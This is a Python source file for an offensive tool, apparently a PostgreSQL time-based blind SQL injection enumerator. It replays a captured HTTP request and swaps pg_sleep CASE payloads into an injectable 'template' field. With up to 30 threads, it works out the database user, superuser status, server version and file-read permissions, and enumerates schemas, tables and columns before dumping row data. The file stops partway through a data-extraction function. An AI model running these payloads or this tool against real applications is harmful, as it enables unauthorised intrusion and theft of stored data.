import requests
import time
import json
import sys
import re
import concurrent.futures
import logging
import argparse
import pickle
import os
from urllib3.exceptions import InsecureRequestWarning
import datetime

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#####################################################
# CONFIGURATION SETTINGS - MODIFY THESE AS NEEDED
#####################################################
# Core extraction settings
DELAY = 2  # Sleep delay in seconds
TIME_THRESHOLD = 1.5  # Time threshold to determine if sleep was triggered
MAX_CHARS = 50  # Maximum characters per name
MAX_WORKERS = 30  # Maximum number of concurrent threads
# Removed MAX_CSRF_REFRESH_ATTEMPTS

# Other settings
VERIFY_SSL = False  # Change to True if you want to verify SSL certificates
SAVE_INTERVAL = 60  # Save progress every 60 seconds
#####################################################

# Global resume variables
resume_data = {
    'table_name': None,
    'database': 'public',
    'column_names': [],
    'extracted_columns': {},
    'current_column_index': 0,
    'row_count': 0,
    'extracted_row_count': 0,
    'extracted_rows': [],  # Add this new field to store already extracted rows
    'offset': 0,
    'limit': None,
    'timestamp': 0
    # Removed 'csrf_token' and 'csrf_cookie' entries
}

last_save_time = time.time()

# Cache for query results to avoid redundant requests
query_cache = {}

def display_banner():
    """Display the banner when the script runs"""
    banner = """
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║     ██████╗ ███████╗ ██████╗ ██╗        ███████╗███╗   ██╗██╗   ██╗███╗   ███╗    ║
║     ██╔══██╗██╔════╝██╔═══██╗██║        ██╔════╝████╗  ██║██║   ██║████╗ ████║    ║
║     ██████╔╝███████╗██║   ██║██║        █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║    ║
║     ██╔═══╝ ╚════██║██║▄▄ ██║██║        ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║    ║
║     ██║     ███████║╚██████╔╝███████╗   ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║    ║
║     ╚═╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝    ║
║                                                                                   ║
╠═══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                   ║
║        PostgreSQL Time-Based Blind SQLi Enumeration & Command Executor            ║
║                                                                                   ║
║     [+] Author:  Ivan Spiridonov (@xbz0n)                                         ║
║     [+] Twitter: https://twitter.com/xbz0n                                        ║
║     [+] Email:   ivanspiridonov@gmail.com                                         ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝

"""
    print(banner)

def save_progress(force=False, resume_file='psql_extraction.resume'):
    """Save current progress to resume file"""
    global last_save_time, resume_data, query_cache
    
    current_time = time.time()
    # Save progress periodically or when forced
    if force or (current_time - last_save_time) > SAVE_INTERVAL:
        resume_data['timestamp'] = current_time
        resume_data['query_cache'] = query_cache
        
        try:
            with open(resume_file, 'wb') as f:
                pickle.dump(resume_data, f)
                
            if force:
                print(f"[+] Progress saved to {resume_file}")
            last_save_time = current_time
            return True
        except Exception as e:
            print(f"[!] Error saving progress: {e}")
            return False
    
    return False

def load_progress(resume_file):
    """Load progress from resume file"""
    global resume_data, query_cache
    
    try:
        if not os.path.exists(resume_file):
            print(f"[!] Resume file not found: {resume_file}")
            return False
            
        with open(resume_file, 'rb') as f:
            loaded_data = pickle.load(f)
        
        # Update resume data
        resume_data.update(loaded_data)
        
        # Restore query cache
        if 'query_cache' in loaded_data:
            query_cache = loaded_data['query_cache']
        
        # Calculate how old the resume file is
        time_ago = time.time() - resume_data.get('timestamp', 0)
        minutes, seconds = divmod(time_ago, 60)
        hours, minutes = divmod(minutes, 60)
        
        print(f"[+] Loaded resume data from {resume_file}")
        print(f"[+] Resume file is {int(hours)}h {int(minutes)}m {int(seconds)}s old")
        
        # Print summary of what we're resuming
        print(f"[+] Resuming extraction for table: {resume_data['table_name']}")
        print(f"[+] Database: {resume_data['database']}")
        print(f"[+] Columns: {', '.join(resume_data['column_names']) if resume_data['column_names'] else 'Not yet extracted'}")
        
        # Check for extracted rows
        extracted_rows_count = 0
        if 'extracted_rows' in resume_data and resume_data['extracted_rows']:
            extracted_rows_count = len(resume_data['extracted_rows'])
        elif 'extracted_row_count' in resume_data:
            extracted_rows_count = resume_data['extracted_row_count']
            
        print(f"[+] Progress: {extracted_rows_count} of {resume_data['row_count']} rows extracted")
        print(f"[+] Current column: {resume_data['current_column_index'] + 1} of {len(resume_data['column_names']) if resume_data['column_names'] else '?'}")
        print(f"[+] Loaded {len(query_cache)} cached query results")
        
        return True
    except Exception as e:
        print(f"[!] Error loading resume file: {e}")
        return False

def parse_request_file(filename):
    """Parse a complete HTTP request file"""
    global resume_data
    
    try:
        with open(filename, 'r') as file:
            content = file.read()
            
            # Split headers and body
            parts = content.split('\n\n', 1)
            if len(parts) < 2:
                # Check if it's a GET request without a body
                if 'GET' in content.split('\n')[0]:
                    headers_section = content
                    body = ""
                else:
                    print(f"Error: Request file {filename} must contain headers and body separated by a blank line")
                    sys.exit(1)
            else:
                headers_section, body = parts
            
            # Parse headers
            header_lines = headers_section.split('\n')
            request_line = header_lines[0].split()
            
            if len(request_line) < 3:
                print(f"Error: Invalid request line format in {filename}")
                sys.exit(1)
                
            method = request_line[0]
            path = request_line[1]
            
            # Extract host and construct URL
            host = None
            headers = {}
            for line in header_lines[1:]:
                if line.strip():
                    try:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                        if key.lower().strip() == 'host':
                            host = value.strip()
                        
                        # Remove CSRF token extraction
                    except:
                        pass  # Skip malformed headers
            
            # Remove CSRF cookie extraction from Cookie header
            
            if not host:
                print(f"Error: No Host header found in request file {filename}")
                sys.exit(1)
                
            scheme = "https"  # Assume HTTPS for security
            url = f"{scheme}://{host}{path}"
            
            # For the main request, find injection pattern in the body
            if 'POST' in method and body:
                # Look for the template field and the ' || ... || ' pattern
                template_match = re.search(r'"template":"([^"]*\'\s*\|\|\s*)([^"]*?)(\s*\|\|\s*\'[^"]*)"', body)
                if template_match:
                    prefix = template_match.group(1)
                    injection_point = template_match.group(2)
                    suffix = template_match.group(3)
                    
                    # Create pattern for replacement
                    pattern = re.escape(prefix) + re.escape(injection_point) + re.escape(suffix)
                    replacement_template = prefix + "{}" + suffix
                    
                    return {
                        'method': method,
                        'url': url,
                        'headers': headers,
                        'body': body,
                        'pattern': pattern,
                        'replacement_template': replacement_template
                    }
                else:
                    print(f"Warning: Could not identify injection point in request body for {filename}")
            
            # For any other request
            return {
                'method': method,
                'url': url,
                'headers': headers,
                'body': body
            }
            
    except Exception as e:
        print(f"Error reading or parsing request file {filename}: {e}")
        sys.exit(1)

def handle_token_expiration(request_info, resume_file='psql_extraction.resume'):
    """Handle token expiration by saving state and providing instructions to resume"""
    global resume_data
    
    print("\n[!] AUTHENTICATION ERROR: Your session token has expired.")
    print("[!] Saving current progress to resume later...")
    
    save_progress(force=True, resume_file=resume_file)
    
    print("\n" + "=" * 75)
    print("RESUME INSTRUCTIONS:")
    print("=" * 75)
    print("1. Update your request file with a fresh authentication token/cookies")
    print("2. Resume the extraction with the command:")
    print(f"   python {sys.argv[0]} {sys.argv[1]} --resume {resume_file} [additional options]")
    print("=" * 75)
    
    sys.exit(1)

def make_injection_request(request_info, sql_injection, resume_file='psql_extraction.resume'):
    """Make a request with the SQL injection payload and measure time"""
    global query_cache
    
    # Check cache first to avoid redundant requests
    cache_key = sql_injection
    if cache_key in query_cache:
        return query_cache[cache_key]

    # Replace the injection point with the SQL injection payload
    body = request_info['body']
    pattern = request_info['pattern']
    replacement = request_info['replacement_template'].format(sql_injection)
    
    modified_body = re.sub(pattern, replacement, body, 1)
    
    # Make the request with retries
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Parse JSON for the body
            data = json.loads(modified_body)
            
            # Use headers directly without token manipulation
            headers = request_info['headers'].copy()
            
            start_time = time.time()
            response = requests.request(
                request_info['method'],
                request_info['url'],
                headers=headers,
                json=data,
                timeout=DELAY * 2,  # Set timeout to double the sleep time
                verify=VERIFY_SSL
            )
            
            end_time = time.time()
            elapsed_time = end_time - start_time
            
            # Check if we got a 403 error (forbidden - expired token)
            if response.status_code == 403:
                # Handle token expiration
                handle_token_expiration(request_info, resume_file)
            
            # No need to check for CSRF cookies in response
            
            result = (elapsed_time, response.status_code)
            query_cache[cache_key] = result  # Cache the result
            return result
        
        except requests.exceptions.Timeout:
            # If timeout, it likely means the sleep function was triggered
            result = (DELAY * 2, 0)  # Simulate a long response time
            query_cache[cache_key] = result  # Cache the result
            return result
            
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)  # Wait before retrying
                continue
            else:
                print(f"Error making request after {max_retries} attempts: {e}")
                return (-1, None)

def run_test_query(request_info, sql_query, resume_file='psql_extraction.resume'):
    """Run a test query and check if it causes a delay"""
    elapsed_time, status_code = make_injection_request(request_info, sql_query, resume_file)
    
    # If there was an error, elapsed_time will be -1
    if elapsed_time == -1:
        return False, elapsed_time, status_code
        
    return elapsed_time >= TIME_THRESHOLD, elapsed_time, status_code

def extract_char_binary_search(request_info, sql_fragment, position, verbose=False):
    """Extract a character using binary search with improved reliability"""
    min_ascii = 32  # Space
    max_ascii = 126  # Tilde
    
    # First attempt - binary search
    while min_ascii <= max_ascii:
        mid_ascii = (min_ascii + max_ascii) // 2
        
        sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) > {mid_ascii}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        greater_than, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if verbose:
            print(f"Char at position {position} > ASCII {mid_ascii} ({chr(mid_ascii)}): {'Yes' if greater_than else 'No'} ({elapsed_time:.2f}s)")
        
        if greater_than:
            min_ascii = mid_ascii + 1
        else:
            sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {mid_ascii}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            equals, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            if verbose:
                print(f"Char at position {position} = ASCII {mid_ascii} ({chr(mid_ascii)}): {'Yes' if equals else 'No'} ({elapsed_time:.2f}s)")
            
            if equals:
                # Verify the result with a second check
                sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {mid_ascii}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                verification, elapsed_time, status_code = run_test_query(request_info, sql_query)
                
                if verification:
                    return chr(mid_ascii)
                elif verbose:
                    print(f"Verification failed for char at position {position} = ASCII {mid_ascii}")
            
            max_ascii = mid_ascii - 1
    
    # Second attempt - try each ASCII value for common characters
    common_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-. "
    for char in common_chars:
        char_code = ord(char)
        sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {char_code}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        equals, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if equals:
            # Verify the result with a second check
            sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {char_code}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            verification, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            if verification:
                if verbose:
                    print(f"Found exact match at position {position}: ASCII {char_code} ({char})")
                return char
    
    # Third attempt - try exact matches for all ASCII codes
    for char_code in range(32, 127):
        sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {char_code}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        equals, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if equals:
            # Verify the result with a second check
            sql_query = f"(CASE WHEN (ASCII(SUBSTRING({sql_fragment}, {position}, 1)) = {char_code}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            verification, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            if verification:
                if verbose:
                    print(f"Found exact match at position {position}: ASCII {char_code} ({chr(char_code)})")
                return chr(char_code)
    
    return "?"  # Use "?" for characters we couldn't identify

def extract_string_parallel(request_info, sql_fragment, label, verbose=False, print_result=True):
    """Extract a string using parallel character position extraction"""
    # Get string length first
    length = 0
    for pos in range(1, MAX_CHARS + 1):
        sql_query = f"(CASE WHEN (LENGTH({sql_fragment}) >= {pos}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_length, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if verbose:
            print(f"{label} length >= {pos}: {'Yes' if has_length else 'No'} ({elapsed_time:.2f}s)")
        
        if not has_length:
            length = pos - 1
            break
        length = pos
    
    if verbose:
        print(f"[+] {label} length: {length}")
    elif print_result:
        print(f"[*] Extracting {label}... (length: {length})")
    
    if length == 0:
        return ""
    
    # Extract characters in parallel
    result = [""] * length
    completed_positions = set()
    
    # Use multiple passes to ensure we get all characters
    for attempt in range(3):  # Try up to 3 passes
        if len(completed_positions) == length:
            break
            
        remaining_positions = [pos for pos in range(1, length + 1) if pos not in completed_positions]
        
        if not remaining_positions:
            break
            
        if verbose:
            print(f"[+] Extracting characters (pass {attempt+1})... {len(completed_positions)}/{length} completed")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(remaining_positions), MAX_WORKERS)) as executor:
            future_to_position = {executor.submit(extract_char_binary_search, request_info, sql_fragment, pos, verbose): pos for pos in remaining_positions}
            
            for future in concurrent.futures.as_completed(future_to_position):
                position = future_to_position[future]
                try:
                    char = future.result()
                    if char and char != "?":
                        result[position - 1] = char
                        completed_positions.add(position)
                    
                    # Only show intermediate progress in verbose mode
                    if verbose:
                        current = ''.join([c if c else '?' for c in result])
                        print(f"[+] Current {label}: {current}")
                except Exception as e:
                    if verbose:
                        print(f"Error extracting character at position {position}: {e}")
    
    final_result = ''.join([c if c else '?' for c in result])
    if print_result:
        print(f"[+] {label}: {final_result}")
    return final_result

def extract_current_user(request_info, verbose=False):
    """Extract the current database user"""
    print("\n[*] Extracting current PostgreSQL user...")
    return extract_string_parallel(request_info, "(SELECT current_user)", "Current user", verbose)

def is_db_admin(request_info):
    """Check if the current user is a database administrator"""
    print("\n[*] Checking if current user is a database administrator...")
    
    # Check if user has pg_read_all_settings privilege (admin-only)
    sql_query = "(CASE WHEN (SELECT usesuper FROM pg_user WHERE usename = current_user) THEN (SELECT pg_sleep({})) ELSE pg_sleep(0) END)".format(DELAY)
    is_admin, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    print(f"[+] Is database admin: {'Yes' if is_admin else 'No'}")
    return is_admin

def extract_table_name(request_info, table_index=0, database='public', verbose=False):
    """Extract a single table name"""
    print(f"\n[*] Extracting table name at index {table_index} from schema '{database}'...")
    
    # First check if the table exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT 1 OFFSET {table_index}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not exists:
        print(f"[!] Table #{table_index} does not exist in schema '{database}'")
        return None
    
    # Extract the table name
    sql_fragment = f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT 1 OFFSET {table_index})"
    return extract_string_parallel(request_info, sql_fragment, "Table name", verbose)

def extract_column_name(request_info, table_name, column_index, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Extract a single column name from a table"""
    # Print a status message only if not in verbose mode (verbose will print more details)
    if not verbose:
        print(f"[*] Extracting column name at index {column_index} from table '{database}.{table_name}'...")
    
    # First check if the column exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' ORDER BY column_name LIMIT 1 OFFSET {column_index}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Column #{column_index} does not exist in table '{database}.{table_name}'")
        return None
    
    # Extract the column name
    sql_fragment = f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' ORDER BY column_name LIMIT 1 OFFSET {column_index})"
    column_name = extract_string_parallel(request_info, sql_fragment, f"Column {column_index+1}", verbose, print_result=False)
    
    # Print the column name only once - use a simpler message in parallel mode
    print(f"[+] Extracted column {column_index+1}: {column_name}")
    
    # Validate column name if it looks suspicious
    if any(c in column_name for c in "$#@%&"):
        print(f"[!] Column name '{column_name}' appears suspicious, validating...")
        validation_attempt = extract_string_parallel(
            request_info, 
            sql_fragment, 
            f"Validating column {column_index+1}", 
            verbose,
            print_result=False
        )
        if validation_attempt and validation_attempt != column_name:
            print(f"[!] Validation produced different result: '{validation_attempt}', using this instead")
            column_name = validation_attempt
            print(f"[+] Corrected column {column_index+1}: {column_name}")
    
    return column_name

def extract_postgres_version(request_info, verbose=False):
    """Extract PostgreSQL version information"""
    print("\n[*] Extracting PostgreSQL version information...")
    return extract_string_parallel(request_info, "(SELECT version())", "PostgreSQL version", verbose)

def extract_current_database(request_info, verbose=False):
    """Extract current database name"""
    print("\n[*] Extracting current database name...")
    return extract_string_parallel(request_info, "(SELECT current_database())", "Current database", verbose)

def extract_schema_name(request_info, schema_index=0, verbose=False):
    """Extract a schema name at a specific index"""
    print(f"\n[*] Extracting schema name at index {schema_index}...")
    
    # First check if the schema exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {schema_index}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not exists:
        print(f"[!] Schema #{schema_index} does not exist")
        return None
    
    # Extract the schema name
    sql_fragment = f"(SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {schema_index})"
    return extract_string_parallel(request_info, sql_fragment, "Schema name", verbose)

def extract_database_name(request_info, db_index=0, verbose=False):
    """Extract a database name at a specific index"""
    print(f"\n[*] Extracting database name at index {db_index}...")
    
    # First check if the database exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_database ORDER BY datname LIMIT 1 OFFSET {db_index}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not exists:
        print(f"[!] Database #{db_index} does not exist")
        return None
    
    # Extract the database name
    sql_fragment = f"(SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {db_index})"
    return extract_string_parallel(request_info, sql_fragment, "Database name", verbose)

def extract_table_count(request_info, table_name, database='public'):
    """Extract approximate row count from a table"""
    print(f"\n[*] Estimating row count for table '{database}.{table_name}'...")
    
    # First check if the table exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='{database}' AND table_name='{table_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not exists:
        print(f"[!] Table '{database}.{table_name}' does not exist")
        return None
    
    # Get approximate row count using binary search
    print("[+] Using binary search to find approximate row count...")
    min_count = 0
    max_count = 1000000  # Start with a reasonable maximum
    
    # Test if table has more than max_count rows
    sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM {database}.{table_name}) > {max_count}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_more, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if has_more:
        print(f"[!] Table has more than {max_count} rows, using this as minimum estimate")
        return f"> {max_count}"
    
    # Binary search to find approximate count
    while max_count - min_count > 100:  # Stop when we're within 100 rows for efficiency
        mid_count = (min_count + max_count) // 2
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM {database}.{table_name}) >= {mid_count}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_more, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if has_more:
            min_count = mid_count
        else:
            max_count = mid_count
    
    # Get more precise count
    for count in range(min_count, max_count + 1, 10):  # Step by 10 for efficiency
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM {database}.{table_name}) = {count}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        equals, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if equals:
            return str(count)
    
    # If we can't get an exact match, return the range
    return f"{min_count}-{max_count}"

def extract_server_information(request_info, verbose=False):
    """Extract server information"""
    print("\n[*] Extracting server information...")
    
    # Try to get server version, which often includes OS info
    server_version = extract_string_parallel(request_info, 
                                          "(SELECT version())", 
                                          "Server version",
                                          verbose)
    
    # Try to get server IP address using a safer approach
    # First check if inet_server_addr() function is available
    print("\n[*] Attempting to get server IP address...")
    try:
        # Try different methods to get IP information
        ip_methods = [
            "(SELECT inet_server_addr())",
            "(SELECT current_setting('listen_addresses'))",
            "(SELECT inet_client_addr())"
        ]
        
        hostname = None
        for method in ip_methods:
            sql_query = f"(CASE WHEN (SELECT LENGTH({method}) > 0) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            has_result, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            if has_result:
                hostname = extract_string_parallel(request_info, method, "Server IP", verbose)
                if hostname and hostname != "?":
                    break
                
        if not hostname or hostname == "?":
            hostname = "Could not determine"
    except:
        hostname = "Error retrieving"
    
    return {
        "version": server_version,
        "hostname": hostname
    }

def check_file_read_permission(request_info):
    """Check if PostgreSQL has file read permissions - handles errors gracefully"""
    print("\n[*] Checking if PostgreSQL has file read permissions...")
    
    try:
        # Try to read a common file like pg_hba.conf in a safer way
        # First check if pg_ls_dir function exists
        sql_query = "(CASE WHEN (SELECT COUNT(*) FROM pg_proc WHERE proname = 'pg_ls_dir') > 0 THEN (SELECT pg_sleep({})) ELSE pg_sleep(0) END)".format(DELAY)
        function_exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        # Handle 403 error
        if elapsed_time == -2 and status_code == 403:
            print("[!] Access denied when checking file read permissions")
            return False
            
        if function_exists:
            # Try using the function with proper error handling
            sql_query = "(CASE WHEN (SELECT count(*) FROM pg_ls_dir('.') LIMIT 1) > 0 THEN (SELECT pg_sleep({})) ELSE pg_sleep(0) END)".format(DELAY)
            has_permission, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            # Handle 403 error
            if elapsed_time == -2 and status_code == 403:
                print("[!] Access denied when trying to list directory")
                return False
                
            if has_permission:
                print("[+] PostgreSQL has directory listing permissions!")
                return True
        
        # Try another method
        sql_query = "(CASE WHEN (SELECT COUNT(*) FROM pg_proc WHERE proname = 'pg_read_file') > 0 THEN (SELECT pg_sleep({})) ELSE pg_sleep(0) END)".format(DELAY)
        function_exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        # Handle 403 error
        if elapsed_time == -2 and status_code == 403:
            print("[!] Access denied when checking for pg_read_file function")
            return False
            
        if function_exists:
            # Try a safer approach to file reading
            sql_query = "(CASE WHEN EXISTS (SELECT 1 FROM pg_read_file('PG_VERSION', 0, 1) LIMIT 1) THEN (SELECT pg_sleep({})) ELSE pg_sleep(0) END)".format(DELAY)
            has_permission, elapsed_time, status_code = run_test_query(request_info, sql_query)
            
            # Handle 403 error
            if elapsed_time == -2 and status_code == 403:
                print("[!] Access denied when trying to read files")
                return False
                
            if has_permission:
                print("[+] PostgreSQL has file read permissions!")
                return True
    
    except Exception as e:
        print(f"[!] Error checking file permissions: {e}")
    
    print("[-] PostgreSQL does not appear to have file read permissions")
    return False

def search_column_in_tables(request_info, column_pattern, database='public', verbose=False):
    """Search for tables containing a specific column pattern"""
    print(f"\n[*] Searching for columns matching '{column_pattern}' in schema '{database}'...")
    
    # First check if any matching columns exist
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND column_name LIKE '%{column_pattern}%') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not exists:
        print(f"[!] No columns matching '{column_pattern}' found in schema '{database}'")
        return []
        
    # Get count of matching columns
    count = 0
    for i in range(1, 50):  # Limit to 50 matches
        sql_query = f"(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND column_name LIKE '%{column_pattern}%') >= {i} THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_count, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if not has_count:
            count = i - 1
            break
            
    print(f"[+] Found {count} columns matching '{column_pattern}'")
    
    # Extract table and column names for matches
    results = []
    for i in range(count):
        # Get table name
        table_fragment = f"(SELECT table_name FROM information_schema.columns WHERE table_schema='{database}' AND column_name LIKE '%{column_pattern}%' ORDER BY table_name LIMIT 1 OFFSET {i})"
        table_name = extract_string_parallel(request_info, table_fragment, f"Table with {column_pattern} ({i+1}/{count})", verbose)
        
        # Get column name
        column_fragment = f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name LIKE '%{column_pattern}%' LIMIT 1)"
        column_name = extract_string_parallel(request_info, column_fragment, f"Column name ({i+1}/{count})", verbose)
        
        if table_name and column_name:
            results.append((table_name, column_name))
            print(f"[+] Match {i+1}: Table '{table_name}', Column '{column_name}'")
    
    return results

def extract_sample_data(request_info, table_name, column_name, database='public', limit=3, verbose=False):
    """Extract sample data from a specific column"""
    print(f"\n[*] Extracting sample data from '{database}.{table_name}.{column_name}'...")
    
    # Check if table and column exist and have data
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} LIMIT 1) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_data, elapsed_time, status_code = run_test_query(request_info, sql_query)
    
    if not has_data:
        print(f"[!] No data found in table '{database}.{table_name}'")
        return []
    
    # Get count of rows (limited to improve speed)
    row_count = 0
    for i in range(1, limit + 1):
        sql_query = f"(CASE WHEN (SELECT COUNT(*) FROM {database}.{table_name}) >= {i} THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_count, elapsed_time, status_code = run_test_query(request_info, sql_query)
        
        if not has_count:
            row_count = i - 1
            break
        row_count = i
        
    if row_count == 0:
        print(f"[!] No rows found in table '{database}.{table_name}'")
        return []
        
    print(f"[+] Found at least {row_count} rows in table")
    
    # Extract data from rows
    samples = []
    for i in range(min(row_count, limit)):
        data_fragment = f"(SELECT CAST({column_name} AS TEXT) FROM {database}.{table_name} LIMIT 1 OFFSET {i})"
        data = extract_string_parallel(request_info, data_fragment, f"Data sample {i+1}/{min(row_count, limit)}", verbose)
        if data:
            samples.append(data)
    
    return samples

def extract_data_count(request_info, table_name, column_name, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Get the number of rows in a table that will be extracted"""
    print(f"\n[*] Counting rows in '{database}.{table_name}'...")
    
    # Check if table exists and has data
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} LIMIT 1) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_data, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not has_data:
        print(f"[!] No data found in table '{database}.{table_name}'")
        return 0
    
    # Binary search to find approximate count - start with powers of 10
    for power in range(1, 8):  # Up to 10 million
        count = 10 ** power
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM {database}.{table_name}) >= {count}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_count, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if verbose:
            print(f"Testing if >= {count} rows exist: {'Yes' if has_count else 'No'} ({elapsed_time:.2f}s)")
        
        if not has_count:
            # Found range, now do binary search
            min_count = 10 ** (power - 1)
            max_count = count
            break
    else:
        print(f"[!] Table '{database}.{table_name}' has >= 10,000,000 rows, using 10M as limit")
        return 10000000
        
    # Binary search between min_count and max_count
    while min_count < max_count - 100:  # Get within 100 for efficiency
        mid_count = (min_count + max_count) // 2
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM {database}.{table_name}) >= {mid_count}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_count, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if verbose:
            print(f"Testing if >= {mid_count} rows exist: {'Yes' if has_count else 'No'} ({elapsed_time:.2f}s)")
        
        if has_count:
            min_count = mid_count
        else:
            max_count = mid_count
    
    row_count = min_count
    print(f"[+] Table '{database}.{table_name}' has approximately {row_count} rows")
    return row_count

def extract_data_value(request_info, table_name, column_name, row_index, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Extract a value from a specific row and column using binary search"""
    print(f"\n[*] Extracting value from '{database}.{table_name}.{column_name}' at row {row_index}...")
    
    # First check if the row exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Row {row_index} does not exist in table '{database}.{table_name}'")
        return None
    
    # Check if the value is NULL
    sql_query = f"(CASE WHEN ((SELECT {column_name} FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) IS NULL) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
